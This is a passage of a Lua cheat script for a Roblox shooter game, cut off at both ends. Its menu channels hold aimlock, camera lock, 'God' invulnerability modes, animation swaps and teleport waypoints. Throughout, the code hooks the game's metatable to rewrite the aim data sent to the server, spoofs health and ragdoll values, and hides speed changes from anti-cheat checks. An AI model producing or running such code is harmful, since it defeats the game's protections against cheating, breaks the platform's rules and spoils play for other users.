  local mouse = game.Players.LocalPlayer:GetMouse()
  local placemarker = Instance.new("Part", game.Workspace)
  local guimain = Instance.new("Folder", game.CoreGui)
  
  getgenv().makemarker = function(Parent, Adornee, Color, Size, Size2)
   local e = Instance.new("BillboardGui", Parent)
   e.Name = "PP"
   e.Adornee = Adornee
   e.Size = UDim2.new(Size, Size2, Size, Size2)
   e.AlwaysOnTop = true
   local a = Instance.new("Frame", e)
   a.Size = UDim2.new(4, 0, 4, 0)
   a.BackgroundTransparency = 0.1
   a.BackgroundColor3 = Color
   local g = Instance.new("UICorner", a)
   g.CornerRadius = UDim.new(50, 50)
   return (e)
  end
  
  local data = game.Players:GetPlayers()
  function noob(player)
   local character
   repeat
    wait()
   until player.Character
   local handler = makemarker(guimain, player.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 0, 0), 0.0, 0)
   handler.Name = player.Name
   player.CharacterAdded:connect(
    function(Char)
     handler.Adornee = Char:WaitForChild(_G.PART)
    end
   )
  
   local TextLabel = Instance.new("TextLabel", handler)
   TextLabel.BackgroundTransparency = 1
   TextLabel.Position = UDim2.new(0, 0, 0, -50)
   TextLabel.Size = UDim2.new(0, 100, 0, 100)
   TextLabel.Font = Enum.Font.SourceSansSemibold
   TextLabel.TextSize = 14
   TextLabel.TextColor3 = Color3.new(1, 1, 1)
   TextLabel.TextStrokeTransparency = 0
   TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
   TextLabel.Text = "Name: " .. player.Name
   TextLabel.ZIndex = 10
  
   spawn(
    function()
     while wait() do
      if player.Character then
       TextLabel.Text = player.Name.." | Bounty: "..tostring(player:WaitForChild("leaderstats").Wanted.Value).." | "..tostring(math.floor(player.Character:WaitForChild("Humanoid").Health))
      end
     end
    end
   )
  end
  
  for i = 1, #data do
   if data[i] ~= game.Players.LocalPlayer then
    noob(data[i])
   end
  end
  
  game.Players.PlayerAdded:connect(
   function(Player)
    noob(Player)
   end
  )
  
  game.Players.PlayerRemoving:Connect(
   function(player)
    guimain[player.Name]:Destroy()
   end
  )
  
  spawn(
   function()
    placemarker.Anchored = true
    placemarker.CanCollide = false
    placemarker.Size = Vector3.new(0.1, 0.1, 0.1)
    placemarker.Transparency = _G.SHIT
    makemarker(placemarker, placemarker, Color3.fromRGB(255, 0, 0), 0.20, 0)
   end
  )
  
  mouse.KeyDown:Connect(
   function(k)
    if k ~= _G.KEY then
     return
    end
    if enabled then
     --guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     enabled = false
     TextLabel.Text = "------"
    else
     --guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
     enabled = true
     Plr = getClosestPlayerToCursor()
     TextLabel.TextColor3 = Color3.fromRGB(12, 255, 0)
     TextLabel.Text = Plr.Character.Humanoid.DisplayName
    end
   end)
  
  function getClosestPlayerToCursor()
   local closestPlayer
   local shortestDistance = math.huge
  
   for i, v in pairs(game.Players:GetPlayers()) do
    if
     v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
      v.Character.Humanoid.Health ~= 0 and
      v.Character:FindFirstChild(_G.PART)
     then
     local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
     local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
     if magnitude < shortestDistance then
      closestPlayer = v
      shortestDistance = magnitude
     end
    end
   end
   return closestPlayer
  end
  
  game:GetService "RunService".Stepped:connect(
   function()
    if enabled and Plr.Character and Plr.Character:FindFirstChild(_G.PART) then
     placemarker.CFrame =
      CFrame.new(Plr.Character[_G.PART].Position + _G.Frame + (Plr.Character[_G.PART].Velocity * accomidationfactor))
    else
     placemarker.CFrame = CFrame.new(0, 9999, 0)
    end
   end
  )
  
  local mt = getrawmetatable(game)
  local old = mt.__namecall
  setreadonly(mt, false)
  mt.__namecall =
   newcclosure(
   function(...)
    local args = {...}
    if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
     args[3] = Plr.Character[_G.PART].Position+ _G.Frame + (Plr.Character[_G.PART].Velocity * accomidationfactor)
     return old(unpack(args))
    end
    return old(...)
   end
  )
  
  game.Players.LocalPlayer.Chatted:Connect(
   function(Chat)
    if Chat == "print" then
     print(accomidationfactor)
    end
   end
  )
  
  game.Players.LocalPlayer.Chatted:Connect(
   function(Chat)
    if Chat == "Code:1029" then
  
     _G.KEY = nil
     _G.AIR = nil
     _G.PART = nil
     _G.PRED = nil
     TextLabel.Visible = false
  
  
    end
   end
  )
  
  game.Players.LocalPlayer.Chatted:Connect(
   function(Chat)
    if Chat == "Code:1030" then
  
    _G.KEY = "q"
    _G.PART = "UpperTorso"
    _G.PRED = 0.037
    _G.Frame = Vector3.new(0,0.0,0)
    _G.AIR = -0.5
    _G.SHIT = 1
  
  
    end
   end
  )
  
  
  
  game.Players.LocalPlayer.Chatted:Connect(
   function(Chat)
    if Chat == "P+" then
  
  
     _G.PRED = _G.PRED+0.001
  
  
  
    end
   end
  )
  
  game.Players.LocalPlayer.Chatted:Connect(
   function(Chat)
    if Chat == "P-" then
  
     _G.PRED = _G.PRED-0.001
  
  
  
    end
   end
  )
  
  
  --[[
  while wait() do
   local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
   local Value = tostring(ping)
   local pingValue = Value:split(" ")
   local PingNumber = pingValue[1]
   
   accomidationfactor = PingNumber / 1000 + _G.PRED
    if getClosestPlayerToCursor().Character.Humanoid.Jump == true and AimlockTarget.Character.Humanoid.FloorMaterial == Enum.Material.Air then
    _G.PART = "RightFood"
    accomidationfactor = _G.AIR
   else
    getClosestPlayerToCursor().Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
     if new == Enum.HumanoidStateType.Freefall then
      _G.PART = "RightFood"
      accomidationfactor = _G.AIR
     else
      _G.PART = "UpperTorso"
      accomidationfactor = PingNumber / 1000 + _G.PRED
     end
    end)
   end
  end
  
  ]]
  
  while wait() do
   local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
   local Value = tostring(ping)
   local pingValue = Value:split(" ")
   local PingNumber = pingValue[1]
   
   accomidationfactor = PingNumber / 1000 + _G.PRED
  end
 end
)

aimstuff:Textbox(
 "Aimlock Prediction!",
 "Enter a predicton.",
 function(V)
  _G.PRED = V
 end
)


getgenv().Prediction = 0.15038
getgenv().AimPart = "HumanoidRootPart"
getgenv().Key = "C"
getgenv().DisableKey = "P"

getgenv().FOV = true
getgenv().ShowFOV = false
getgenv().FOVSize = 55

aimstuff:Label("Camera Lock - Not the best.")

aimstuff:Button(
 "Camera Lock [C]",
 function()
--// Variables (Service)

local Players = game:GetService("Players")
local RS = game:GetService("RunService")
local WS = game:GetService("Workspace")
local GS = game:GetService("GuiService")
local SG = game:GetService("StarterGui")

--// Variables (regular)

local LP = Players.LocalPlayer
local Mouse = LP:GetMouse()
local Camera = WS.CurrentCamera
local GetGuiInset = GS.GetGuiInset

local AimlockState = true
local Locked
local Victim

local SelectedKey = getgenv().Key

--// Notification function

function Notify(tx)
    SG:SetCore("SendNotification", {
        Title = "Camera Lock Enabled",
        Text = tx,
        Duration = 5
    })
end

--// Check if aimlock is loaded

if getgenv().Loaded == true then
    Notify("Camera Lock is already loaded!")
    return
end

getgenv().Loaded = true

--// FOV Circle

local fov = Drawing.new("Circle")
fov.Filled = false
fov.Transparency = 1
fov.Thickness = 1
fov.Color = Color3.fromRGB(255, 0, 0)
fov.NumSides = 1000

--// Functions

function update()
    if getgenv().FOV == true then
        if fov then
            fov.Radius = getgenv().FOVSize * 2
            fov.Visible = getgenv().ShowFOV
            fov.Position = Vector2.new(Mouse.X, Mouse.Y + GetGuiInset(GS).Y)

            return fov
        end
    end
end

function WTVP(arg)
    return Camera:WorldToViewportPoint(arg)
end

function WTSP(arg)
    return Camera.WorldToScreenPoint(Camera, arg)
end

function getClosest()
    local closestPlayer
    local shortestDistance = math.huge

    for i, v in pairs(game.Players:GetPlayers()) do
        local notKO = v.Character:WaitForChild("BodyEffects")["K.O"].Value ~= true
        local notGrabbed = v.Character:FindFirstChild("GRABBING_COINSTRAINT") == nil
        
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild(getgenv().AimPart) and notKO and notGrabbed then
            local pos = Camera:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
            
            if (getgenv().FOV) then
                if (fov.Radius > magnitude and magnitude < shortestDistance) then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            else
                if (magnitude < shortestDistance) then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
    end
    return closestPlayer
end
 
--// Checks if key is down

Mouse.KeyDown:Connect(function(k)
    SelectedKey = SelectedKey:lower()
    if k == SelectedKey then
        if AimlockState == true then
            Locked = not Locked
            if Locked then
                Victim = getClosest()

                Notify("Locked on: "..tostring(Victim.Character.Humanoid.DisplayName))
            else
                if Victim ~= nil then
                    Victim = nil

                    Notify("Unlocked!")
                end
            end
        else
            Notify("Aimlock is not enabled!")
        end
    end
end)

--// Loop update FOV and loop camera lock onto target

RS.RenderStepped:Connect(function()
    update()
    if AimlockState == true then
        if Victim ~= nil then
            Camera.CFrame = CFrame.new(Camera.CFrame.p, Victim.Character[getgenv().AimPart].Position + Victim.Character[getgenv().AimPart].Velocity*getgenv().Prediction)
        end
    end
end)
end
)


aimstuff:Toggle(
 "Show FOV",
 false,
 function(cool)
  if cool == true then
   getgenv().ShowFOV = true
  elseif cool == false then
   getgenv().ShowFOV = false
  end
 end
)

aimstuff:Slider(
 "FOV Size",
 10,
 150,
 50,
 function(v)
  getgenv().FOVSize = v
 end
)

aimstuff:Textbox(
 "Camera-Lock Prediction",
 "Enter A prediction",
 true,
 function(V)
  getgenv().Prediction = V
 end
)


aimstuff:Label("Next update will have silent")
-- // god stuff

local godst = serv:Channel("God Stuff")

godst:Button(
 "Full God",
 function()
  for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
   if v:IsA('MeshPart') or v:IsA('Part') or v:IsA('Accessory') then
    v:Destroy()
   end
  end
  game.Players.LocalPlayer.Character.Name = 'Deleted'
  local localPlayer = game:GetService('Players').LocalPlayer;
  local localCharacter = localPlayer.Character;
  localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
  local newCharacter = localPlayer.CharacterAdded:Wait();
  local spoofFolder = Instance.new('Folder');
  spoofFolder.Name = 'FULLY_LOADED_CHAR';
  spoofFolder.Parent = newCharacter;
  newCharacter:WaitForChild('RagdollConstraints'):Destroy();
  local spoofValue = Instance.new('BoolValue', newCharacter);
  spoofValue.Name = 'RagdollConstraints';
  local name = game.Players.LocalPlayer.Name
  local lol =    game.Workspace:WaitForChild(name)
  local money = Instance.new("Folder",game.Players.LocalPlayer.Character);money.Name = "FULLY_LOADED_CHAR"
  lol.Parent = game.Workspace.Players
  game.Players.LocalPlayer.Character:WaitForChild("BodyEffects")
  game.Players.LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
  game.Players.LocalPlayer.Character.Name = 'Deleted'
  local localPlayer = game:GetService('Players').LocalPlayer;
  local localCharacter = localPlayer.Character;
  localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
  local newCharacter = localPlayer.CharacterAdded:Wait();
  local spoofFolder = Instance.new('Folder');
  spoofFolder.Name = 'FULLY_LOADED_CHAR';
  spoofFolder.Parent = newCharacter;
  newCharacter:WaitForChild('BodyEffects').Dead:Destroy();
  local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
  spoofValue.Name = 'Dead';
  wait()
  --godblock/godbullet
  local ps = game:GetService("Players")
  local lp = ps.LocalPlayer
  local char = lp.Character
  
  char.BodyEffects.Armor:Destroy()
  char.BodyEffects.Defense:Destroy()
  
  local Clone1 = Instance.new("IntValue")
  Clone1.Name = "Armor"
  Clone1.Parent = char.BodyEffects
  
  local Clone2 = Instance.new("NumberValue")
  Clone2.Name = "Defense"
  Clone2.Parent = char.BodyEffects
  wait()
  --walspeed
  local d = {}
  local e = {}
  local g = {}
  local h = {}
  local j = {}
  local k = {}
  local function l()
   local m = 3
   local n = checkcaller
   local o = getrawmetatable(game)
   setreadonly(o, false)
   local p = o.__index
   local q = o.__newindex
   local r = o.__namecall
   o.__index =
    newcclosure(
     function(s, t)
     if n() then
      return p(s, t)
     end
     if d[s] and d[s][t] then
      local u = d[s][t]
      if u["IsCallback"] == true then
       return u["Value"](s)
      else
       return u["Value"]
      end
     end
     if g[t] then
      local v = g[t]
      if v["IsCallback"] == true then
       return v["Value"](s)
      else
       return v["Value"]
      end
     end
     if j[s] and j[s][t] then
      return k[s][t]
     end
     return p(s, t)
    end
    )
   o.__newindex =
    newcclosure(
     function(w, x, y)
     if n() then
      return q(w, x, y)
     end
     if e[w] and e[w][x] then
      local z = e[w][x]
      if z["Callback"] == nil then
       return
      else
       z["Callback"](w, y)
       return
      end
     end
     if h[x] then
      local A = h[x]
      if A["Callback"] == nil then
       return
      else
       A["Callback"](w, y)
       return
      end
     end
     if j[w] and j[w][x] then
      local B = j[w][x]
      if type(y) ~= B["Type"] then
       error("bad argument #3 to '" .. x .. "' (" .. B["Type"] .. " expected, got " .. type(x) .. ")")
      end
      k[w][x] = y
      return
     end
     return q(w, x, y)
    end
    )
   local D = game.Players.LocalPlayer.Character.Humanoid
   local function A(_)
    local a0 = p(D, _)
    local a1 = type(a0)
    if not j[D] then
     j[D] = {}
    end
    if not k[D] then
     k[D] = {}
    end
    j[D][_] = {Type = a1}
    k[D][_] = p(D, _)
    local a2 = function()
     j[D][_] = nil
     k[D][_] = nil
    end
    return {remove = a2, Remove = a2}
   end
   A("WalkSpeed")
   A("JumpPower")
  end
  l()
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
  game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
  wait()
  while wait() do
   game.ReplicatedStorage.MainEvent:FireServer("Block", true)
   wait()
   for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
    if (v.Animation.AnimationId:match("rbxassetid://2788354405")) then
     v:Stop();
    end;
   end;
  end
  wait()
  while wait() do
   pcall(function()
    for i, v in pairs(game.Players:GetPlayers()) do
     if (workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude < 1 then
      game.ReplicatedStorage.MainEvent:FireServer("Block", true)
     end
    end
   end)
  end
  end
)

godst:Button(
 "God [Bullet]",
 function()
  for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
   if v:IsA('MeshPart') or v:IsA('Part') or v:IsA('Accessory') then
    v:Destroy()
   end
  end
  game.Players.LocalPlayer.Character.Name = 'Deleted'
  local localPlayer = game:GetService('Players').LocalPlayer;
  local localCharacter = localPlayer.Character;
  localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
  local newCharacter = localPlayer.CharacterAdded:Wait();
  local spoofFolder = Instance.new('Folder');
  spoofFolder.Name = 'FULLY_LOADED_CHAR';
  spoofFolder.Parent = newCharacter;
  newCharacter:WaitForChild('RagdollConstraints'):Destroy();
  local spoofValue = Instance.new('BoolValue', newCharacter);
  spoofValue.Name = 'RagdollConstraints';
  local name = game.Players.LocalPlayer.Name
  local lol =    game.Workspace:WaitForChild(name)
  local money = Instance.new("Folder",game.Players.LocalPlayer.Character);money.Name = "FULLY_LOADED_CHAR"
  lol.Parent = game.Workspace.Players
  game.Players.LocalPlayer.Character:WaitForChild("BodyEffects")
  game.Players.LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
 end
)

godst:Button(
 "God [Block]",
 function()
  for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
   if v:IsA('MeshPart') or v:IsA('Part') or v:IsA('Accessory') then
    v:Destroy()
   end
  end
  game.Players.LocalPlayer.Character.Name = 'Deleted'
  local localPlayer = game:GetService('Players').LocalPlayer;
     local localCharacter = localPlayer.Character;
     localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
     local newCharacter = localPlayer.CharacterAdded:Wait();
     local spoofFolder = Instance.new('Folder');
     spoofFolder.Name = 'FULLY_LOADED_CHAR';
     spoofFolder.Parent = newCharacter;
     newCharacter:WaitForChild('RagdollConstraints'):Destroy();
     local spoofValue = Instance.new('BoolValue', newCharacter);
     spoofValue.Name = 'RagdollConstraints';
     wait()
     --godblock/godbullet
     local ps = game:GetService("Players")
     local lp = ps.LocalPlayer
     local char = lp.Character
 
     char.BodyEffects.Armor:Destroy()
     char.BodyEffects.Defense:Destroy()
 
     local Clone1 = Instance.new("IntValue")
     Clone1.Name = "Armor"
     Clone1.Parent = char.BodyEffects
 
     local Clone2 = Instance.new("NumberValue")
     Clone2.Name = "Defense"
     Clone2.Parent = char.BodyEffects
 end
)
-- // animations
local animations = serv:Channel("Animations")

animations:Button(
    "Astronaut",
    function()
        local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Bubbly",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
  Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
  Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Cartoony",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Elder",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Knight",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Levitation",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Mage",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Ninja",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Pirate",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Robot",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Stylish",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Superhero",
    function()
        local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Toy",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Vampire",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Werewolf",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

animations:Button(
    "Zombie",
    function()
  local Animate = game.Players.LocalPlayer.Character.Animate
  Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
  Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
  Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
  Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
  Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
  Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
  Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
  game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
)

-- // waypoints down here
local waypoints = serv:Channel("Waypoints")

waypoints:Button(
    "Bank  [Inside] [ ð¦ ðµ ]",
    function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-481.471344, 23.0955524, -283.71936, -0.998737395, 1.3537707e-08, 0.0502357483, 1.0023502e-08, 1, -7.02062053e-08, -0.0502357483, -6.96140248e-08, -0.998737395)
 end
)

waypoints:Button(
    "Bank [Top] [ ð¦ ðµ ]",
    function()
